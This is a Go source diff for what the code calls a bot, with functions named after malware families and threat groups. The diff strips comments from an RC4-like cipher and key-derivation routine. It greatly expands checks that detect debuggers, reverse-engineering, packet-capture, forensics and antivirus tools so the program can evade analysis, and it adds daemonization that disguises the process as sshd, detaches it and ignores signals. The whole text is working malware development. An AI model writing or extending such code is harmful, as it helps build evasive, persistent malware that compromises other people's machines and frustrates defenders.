@@ -7,9 +7,11 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"os/signal"
 	"path/filepath"
 	"strconv"
 	"strings"
+	"syscall"
 )
 
 // ============================================================================
@@ -35,9 +37,6 @@ func jirachi() byte { return byte(0xa4 ^ 0x81) }
 // ============================================================================
 
 // charizard derives a 16-byte encryption key from the seed string.
-// It combines: seed + split key bytes + entropy bytes through MD5 hashing.
-// The entropy is XOR'd with position-based values for additional obfuscation.
-// Returns: 16-byte MD5 hash used as encryption key
 func charizard(seed string) []byte {
 	h := md5.New()
 	h.Write([]byte(seed))
@@ -51,13 +50,6 @@ func charizard(seed string) []byte {
 }
 
 // blastoise implements an RC4-like stream cipher for encryption/decryption.
-// RC4 is symmetric, so the same function encrypts and decrypts.
-// Process: Initialize S-box -> Key scheduling -> Generate keystream -> XOR data
-// Parameters:
-//   - data: bytes to encrypt/decrypt
-//   - key: encryption key (derived from charizard)
-//
-// Returns: encrypted/decrypted bytes
 func blastoise(data []byte, key []byte) []byte {
 	s := make([]byte, 256)
 	for i := range s {
@@ -157,7 +149,37 @@ func winnti() bool {
 			}
 		}
 	}
-	analysisTools := []string{"/usr/bin/strace", "/usr/bin/ltrace", "/usr/bin/gdb", "/usr/bin/radare2", "/usr/bin/ghidra", "/usr/bin/ida", "/usr/bin/wireshark", "/usr/bin/tshark", "/usr/bin/tcpdump"}
+	analysisTools := []string{
+		// Debuggers & tracers
+		"/usr/bin/strace", "/usr/bin/ltrace", "/usr/bin/gdb",
+		"/usr/bin/lldb", "/usr/bin/valgrind", "/usr/bin/perf",
+		// Reverse engineering
+		"/usr/bin/radare2", "/usr/bin/r2", "/usr/bin/rizin",
+		"/usr/bin/cutter", "/usr/bin/iaito",
+		"/usr/bin/ghidra", "/usr/bin/ghidraRun",
+		"/usr/bin/ida", "/usr/bin/ida64", "/usr/bin/idat", "/usr/bin/idat64",
+		"/usr/bin/objdump", "/usr/bin/readelf",
+		"/usr/bin/retdec-decompiler",
+		// Network capture & analysis
+		"/usr/bin/wireshark", "/usr/bin/tshark", "/usr/bin/tcpdump",
+		"/usr/bin/ngrep", "/usr/bin/ettercap",
+		"/usr/sbin/tcpdump", "/usr/sbin/ettercap",
+		// Malware analysis frameworks
+		"/usr/bin/yara", "/usr/bin/ssdeep",
+		"/usr/bin/binwalk", "/usr/bin/foremost",
+		// Process & syscall monitoring
+		"/usr/bin/sysdig", "/usr/bin/bpftrace",
+		"/usr/bin/auditd", "/usr/sbin/auditd",
+		"/usr/bin/ausearch", "/usr/sbin/ausearch",
+		"/usr/bin/fatrace", "/usr/bin/inotifywait",
+		// Security scanners
+		"/usr/bin/lynis", "/usr/bin/rkhunter",
+		"/usr/bin/chkrootkit", "/usr/sbin/chkrootkit",
+		"/usr/bin/clamdscan", "/usr/bin/clamscan",
+		// Memory forensics
+		"/usr/bin/volatility", "/usr/bin/vol.py",
+		"/usr/bin/gcore",
+	}
 	for _, tool := range analysisTools {
 		if _, err := os.Stat(tool); err == nil {
 			if out, err := exec.Command("pgrep", "-f", filepath.Base(tool)).Output(); err == nil {
@@ -170,7 +192,11 @@ func winnti() bool {
 	if ppid := os.Getppid(); ppid > 1 {
 		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid)); err == nil {
 			parentCmd := strings.ToLower(string(cmdline))
-			debuggers := []string{"gdb", "strace", "ltrace", "radare2", "rr"}
+			debuggers := []string{
+				"gdb", "lldb", "strace", "ltrace", "radare2", "r2",
+				"rizin", "rr", "valgrind", "perf", "ida", "ida64",
+				"ghidra", "sysdig", "bpftrace", "frida", "frida-server",
+			}
 			for _, debugger := range debuggers {
 				if strings.Contains(parentCmd, debugger) {
 					return true
@@ -198,4 +224,117 @@ func mustangPanda() string {
 	data := fmt.Sprintf("%s:%s", hostname, mac)
 	hash := fmt.Sprintf("%x", md5.Sum([]byte(data)))
 	return hash[:8]
+}
+
+// ============================================================================
+// DAEMONIZATION (UNIX)
+// Full background daemonization: fork, setsid, close fds, ignore signals.
+// ============================================================================
+
+// daemonEnvKey is used to distinguish the parent from the re-exec'd child.
+const daemonEnvKey = "__SSHD_DAEMON"
+
+// stuxnet performs full Unix daemonization so the bot runs completely
+// detached from any controlling terminal.
+//
+
+func stuxnet() {
+	// Already the daemon child – just finish housekeeping.
+	if os.Getenv(daemonEnvKey) == "1" {
+		daemonHousekeep()
+		return
+	}
+
+	// --- Parent path: re-exec as a daemon child ---
+	exe, err := os.Executable()
+	if err != nil {
+		// Can't determine our own path; fall through and run in foreground.
+		return
+	}
+
+	// Set marker so the child knows it is the daemon.
+	env := append(os.Environ(), daemonEnvKey+"=1")
+
+	// Build the child process attributes: new session, detached.
+	attr := &syscall.ProcAttr{
+		Dir: "/",
+		Env: env,
+		Files: []uintptr{
+			uintptr(devNull(os.O_RDONLY)), // stdin
+			uintptr(devNull(os.O_WRONLY)), // stdout
+			uintptr(devNull(os.O_WRONLY)), // stderr
+		},
+		Sys: &syscall.SysProcAttr{
+			Setsid: true,
+		},
+	}
+
+	// Fork+exec ourselves.
+	_, _, forkErr := syscall.StartProcess(exe, os.Args, attr)
+	if forkErr != nil {
+		// Fork failed – just continue in the foreground.
+		return
+	}
+
+	// Parent exits; child is now the daemon.
+	os.Exit(0)
+}
+
+// daemonHousekeep performs post-fork housekeeping in the daemon child:
+// chdir /, umask 0, reopen std fds to /dev/null, ignore signals.
+func daemonHousekeep() {
+	// Change working directory to root.
+	syscall.Chdir("/")
+
+	// Clear umask.
+	syscall.Umask(0)
+
+	// Re-open stdin/stdout/stderr to /dev/null (safety net).
+	devNullFd := devNull(os.O_RDWR)
+	if devNullFd >= 0 {
+		syscall.Dup2(devNullFd, int(os.Stdin.Fd()))
+		syscall.Dup2(devNullFd, int(os.Stdout.Fd()))
+		syscall.Dup2(devNullFd, int(os.Stderr.Fd()))
+		if devNullFd > 2 {
+			syscall.Close(devNullFd)
+		}
+	}
+
+	// Ignore every signal we can.
+	ignoreSignals()
+}
+
+// devNull opens /dev/null with the requested flags and returns the fd.
+// Returns -1 on failure.
+func devNull(flag int) int {
+	fd, err := syscall.Open("/dev/null", flag, 0)
+	if err != nil {
+		return -1
+	}
+	return fd
+}
+
+// ignoreSignals tells the runtime to discard hangup, terminal, and user
+// signals so the daemon survives terminal closes and stray signals.
+//
+// NOTE: SIGTERM is NOT ignored so that revilSingleInstance() can still
+// kill an older daemonized instance when a new binary is deployed.
+func ignoreSignals() {
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig,
+		syscall.SIGHUP,  // terminal hangup — must survive
+		syscall.SIGINT,  // Ctrl-C — no terminal, but be safe
+		syscall.SIGQUIT, // Ctrl-\ — ignore core dump request
+		syscall.SIGUSR1, // user defined
+		syscall.SIGUSR2, // user defined
+		syscall.SIGTSTP, // Ctrl-Z — no terminal to suspend to
+		syscall.SIGTTIN, // bg read from tty
+		syscall.SIGTTOU, // bg write to tty
+	)
+	// Drain and discard in background.
+	go func() {
+		for range sig {
+			// intentionally ignored
+		}
+	}()
 }
